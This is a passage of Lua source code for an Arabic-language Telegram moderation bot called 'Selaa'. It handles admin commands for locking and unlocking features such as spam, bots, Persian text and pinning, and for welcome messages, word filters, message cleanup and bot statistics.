absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Kfr'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الكفر بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الفارسيه بالطرد" then
if not Selaa:get(Selaa..'Selaa:Lock:FarsiBan'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل الفارسيه بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:FarsiBan'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
end
end
if lockptf[2] == "البوتات" or lockptf[2] == "البوتات بالحذف" then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل البوتات بالحذف \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa.."Selaa:Lock:Bots"..msg.chat_id_,"del")  
end
if lockptf[2] == "البوتات بالطرد" then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل البوتات بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa.."Selaa:Lock:Bots"..msg.chat_id_,"kick")  
end
if lockptf[2] == "البوتات بالتقييد" or lockptf[2] == "البوتات بالتقيد" then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل البوتات بالتقييد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa.."Selaa:Lock:Bots"..msg.chat_id_,"ked")  
end
if lockptf[2] == "التكرار" or lockptf[2] == "التكرار بالحذف" then 
Selaa:hset(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل التكرار بالحذف \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if lockptf[2] == "التكرار بالطرد" then 
Selaa:hset(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل التكرار بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if lockptf[2] == "التكرار بالتقيد" or lockptf[2] == "التكرار بالتقييد" then 
Selaa:hset(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل التكرار بالتقييد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if lockptf[2] == "التكرار بالكتم" then 
Selaa:hset(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل التكرار بالكتم \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if BasicConstructor(msg) then
if lockptf[2] == "التثبيت" then
if not Selaa:get(Selaa..'Selaa:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  Selaa:set(Selaa.."Selaa:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم قفل التثبيت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Pin'..msg.chat_id_,true)
Selaa:sadd(Selaa.."Selaa:Lock:Pinpin",msg.chat_id_) 
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆التثبيت بالفعل مقفل في المجموعه', 1, 'md')
end end end
end
end
end
--     Source Selaa     --
if Admin(msg) then
if text and (text:match("^ضع تكرار (%d+)$") or text:match("^وضع تكرار (%d+)$")) then   
local TextSpam = text:match("ضع تكرار (%d+)$") or text:match("وضع تكرار (%d+)$")
if tonumber(TextSpam) < 2 then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم وضع عدد التكرار ⇇ '..TextSpam, 1, 'md')
Selaa:hset(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
Selaa:hset(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم وضع زمن التكرار ⇇ '..TextSpam, 1, 'md')
end
--     Source Selaa     --
if Manager(msg) then
if text and text == 'تفعيل الايدي بالصوره' and ChCheck(msg) then
if not Selaa:get(Selaa..'Selaa:Lock:Id:Photo'..msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الايدي بالصوره بالتاكيد مفعل', 1, 'md')
else
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل الايدي بالصوره'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Id:Photo'..msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل الايدي بالصوره'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'تفعيل الايدي' and ChCheck(msg) then
if not Selaa:get(Selaa..'Selaa:Lock:Id'..msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الايدي بالتاكيد مفعل ', 1, 'md')
else
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل الايدي بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Id'..msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الايدي بالتاكيد معطل ', 1, 'md')
else
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل الايدي بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Id'..msg.chat_id_,true)
end end
end
--     Source Selaa     --
if text == 'ضع رابط' or text == 'وضع رابط' or text == 'ضع الرابط' or text == 'وضع الرابط' then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
Selaa:setex(Selaa.."Selaa:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' or text == 'انشاء الرابط' then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not Selaa:get(Selaa.."Selaa:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
Selaa:set(Selaa.."Selaa:Groups:Links"..msg.chat_id_,LinkGroup) 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم انشاء رابط جديد ارسل ⇇ الرابط', 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
end
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
Selaa:setex(Selaa.."Selaa:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
end
end
end
--     Source Selaa     --
if Admin(msg) then
if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل الترحيب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa.."Selaa:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل الترحيب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa.."Selaa:Lock:Welcome"..msg.chat_id_)
end
if Selaa:get(Selaa..'Selaa:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء حفظ كليشة الترحيب', 1, 'md')
Selaa:del(Selaa..'Selaa:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
Selaa:del(Selaa..'Selaa:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Selaa:set(Selaa..'Selaa:Groups:Welcomes'..msg.chat_id_,text)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حفظ كليشة الترحيب', 1, 'md')
return false   
end
if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆ارسل لي الترحيب الان\n↯☆تستطيع اضافة مايلي ⇇ ⤈\n↯☆دالة عرض الاسم ⇇ firstname\n↯☆دالة عرض المعرف ⇇ username', 1, 'md')
Selaa:set(Selaa..'Selaa:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف الترحيب \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local wel = Selaa:get(Selaa..'Selaa:Groups:Welcomes'..msg.chat_id_)
if wel then
Selaa(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لم يتم وضع الترحيب \n↯☆ارسل ⇇ ضع ترحيب للحفظ ', 1, 'md')
end
end
--     Source Selaa     --
if Selaa:get(Selaa..'Selaa:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم الغاء حفظ الوصف", 1, 'md')
Selaa:del(Selaa..'Selaa:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
Selaa:del(Selaa..'Selaa:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
Selaa:set(Selaa..'Selaa:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆ارسل لي الوصف الان', 1, 'md')
end
--     Source Selaa     --
if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل لي الكلمه الان", 1, 'md') 
Selaa:set(Selaa.."Selaa:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if Selaa:get(Selaa.."Selaa:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء امر المنع', 1, 'md')
Selaa:del(Selaa.."Selaa:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم منع الكلمه ⇇ "..text, 1, 'html')
Selaa:del(Selaa.."Selaa:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
Selaa:hset(Selaa..'Selaa:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل لي الكلمه الان", 1, 'md') 
Selaa:set(Selaa.."Selaa:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if Selaa:get(Selaa.."Selaa:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء امر الغاء المنع', 1, 'md')
Selaa:del(Selaa.."Selaa:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not Selaa:hget(Selaa..'Selaa:Filters:'..msg.chat_id_, text) then  
Selaa(msg.chat_id_, msg.id_, 1, "↯☆الكلمه ⇇ "..text.." غير ممنوعه", 1, 'html')
Selaa:del(Selaa.."Selaa:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
Selaa:hdel(Selaa..'Selaa:Filters:'..msg.chat_id_, text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆الكلمه ⇇ "..text.." تم الغاء منعها", 1, 'html')
Selaa:del(Selaa.."Selaa:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
--     Source Selaa     --
if SudoBot(msg) then
if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "⇇ الاحصائيات ⌁" then
local gps = Selaa:scard(Selaa.."Selaa:Groups") local users = Selaa:scard(Selaa.."Selaa:Users") 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆احصائيات البوت ⇇ ⤈\n↯☆عدد المشتركين ⇇ ❨ '..users..' ❩\n↯☆عدد المجموعات ⇇ ❨ '..gps..' ❩', 1, 'md')
end
if text and text == "المشتركين" and ChCheck(msg) or text and text == "⇇ المشتركين ⌁" then
local users = Selaa:scard(Selaa.."Selaa:Users")
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عدد المشتركين ⇇ ❨ '..users..' ❩', 1, 'md')
end
end
--     Source Selaa     --
if text and text == 'المجموعات' and ChCheck(msg) or text and text == '⇇ المجموعات ⌁' then
if not SudoBot(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطورين فقط ', 1, 'md')
else
local list = Selaa:smembers(Selaa.."Selaa:Groups")
local t = '↯☆مجموعات البوت ⇇ ⤈ \n'
for k,v in pairs(list) do
t = t..k.."~ : `"..v.."`\n" 
end
if #list == 0 then
t = '↯☆لا يوجد مجموعات مفعله'
end
Selaa(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
--     Source Selaa     --
if text and text:match('^تنظيف (%d+)$') and ChCheck(msg) then  
if not Selaa:get(Selaa..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لاتستطيع تنظيف اكثر من 1000 رساله', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
Selaa:setex(Selaa..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "تنظيف المشتركين" and Sudo(msg) and ChCheck(msg) then 
local pv = Selaa:smembers(Selaa.."Selaa:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
Selaa:srem(Selaa.."Selaa:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*لا يوجد مشتركين وهميين*', 1, 'md')
else
local ok = #pv - sendok
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عدد المشتركين الان ⇇ { '..#pv..' }\n↯☆تم حذف ⇇ { '..sendok..' } من المشتركين\n↯☆العدد الحقيقي الان  ⇇ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     Source Selaa     --
if text == "تنظيف الجروبات" and Sudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and Sudo(msg) and ChCheck(msg) then 
local group = Selaa:smembers(Selaa.."Selaa:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
Selaa:srem(Selaa.."Selaa:Groups",group[i]) 
changeChatMemberStatus(group[i], Selaa, "Left")
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
Selaa:srem(Selaa.."Selaa:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
Selaa:srem(Selaa.."Selaa:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
Selaa:srem(Selaa.."Selaa:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Selaa(msg.chat_id_, msg.id_, 1,'↯☆*لاتوجد مجموعات وهميه*', 1, 'md')   
else
local Selaagp2 = (w + q)
local Selaagp3 = #group - Selaagp2
if q == 0 then
Selaagp2 = ''
else
Selaagp2 = '\n↯☆تم حذف ⇇ { '..q..' } مجموعه من البوت'
end
if w == 0 then
Selaagp1 = ''
else
Selaagp1 = '\n↯☆تم حذف ⇇ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
end
Selaa(msg.chat_id_, msg.id_, 1,'↯☆عدد الجروبات الان ⇇ { '..#group..' }'..Selaagp1..''..Selaagp2..'\n↯☆العدد الحقيقي الان  ⇇ ( '..Selaagp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
--     Source Selaa     --
if text == "تفعيل امسح" and Constructor(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل امسح بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) and SourceCh(msg) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل امسح بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and SourceCh(msg) or text == "عدد الميديا" and SourceCh(msg) then 
local M = Selaa:scard(Selaa.."Selaa:cleaner"..msg.chat_id_)
if M ~= 0 then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆عدد الميديا ⇇ "..M, 1, 'md') 
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لاتوجد ميديا هنا", 1, 'md') 
end end
if text == "امسح" and SourceCh(msg) or text == "تنظيف ميديا" and SourceCh(msg) or text == "تنظيف الميديا" and SourceCh(msg) then
local list = Selaa:smembers(Selaa.."Selaa:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(list) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
if Del ~= 0 then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حذف "..Del.." من الميديا", 1, 'md') 
Selaa:del(Selaa.."Selaa:cleaner"..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لاتوجد ميديا هنا", 1, 'md') 
end end 
end
end
--     Source Selaa     --
if Admin(msg) then
if text == "تنظيف تعديل" or text == "تنظيف التعديل" and ChCheck(msg) then   
Selaa_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
Selaa_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Selaa_Del},function(arg,data)
new = 0
Selaa_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
Selaa_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,Selaa_Del2)
end,nil)  
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
--     Source Selaa     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^فتح (.*)$") and ChCheck(msg) then
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpts[2] == "التعديل" then
if Selaa:get(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح التعديل بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆التعديل بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "التعديل الميديا" or unlockpts[2] == "تعديل الميديا" then
if Selaa:get(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح تعديل الميديا\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه" then
if Selaa:get(Selaa..'Selaa:Lock:Farsi'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الفارسيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Farsi'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الفشار" then
if not Selaa:get(Selaa..'Selaa:Lock:Fshar'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الفشار بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Fshar'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الفشار بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الطائفيه" then
if not Selaa:get(Selaa..'Selaa:Lock:Taf'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الطائفيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Taf'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الكفر" then
if not Selaa:get(Selaa..'Selaa:Lock:Kfr'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الكفر بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:Lock:Kfr'..msg.chat_id_,true)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الكفر بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه بالطرد" then
if Selaa:get(Selaa..'Selaa:Lock:FarsiBan'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح الفارسيه بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:FarsiBan'..msg.chat_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
end
end
if unlockpts[2] == "البوتات" then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح البوتات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa.."Selaa:Lock:Bots"..msg.chat_id_)  
end
if unlockpts[2] == "البوتات بالطرد" then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح البوتات بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa.."Selaa:Lock:Bots"..msg.chat_id_)  
end
if unlockpts[2] == "البوتات بالتقييد" then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح البوتات بالتقييد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa.."Selaa:Lock:Bots"..msg.chat_id_)  
end
if unlockpts[2] == "التكرار" then 
Selaa:hdel(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح التكرار بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if BasicConstructor(msg) then
if unlockpts[2] == "التثبيت" then
if Selaa:get(Selaa..'Selaa:Lock:Pin'..msg.chat_id_) then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح التثبيت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Lock:Pin'..msg.chat_id_)
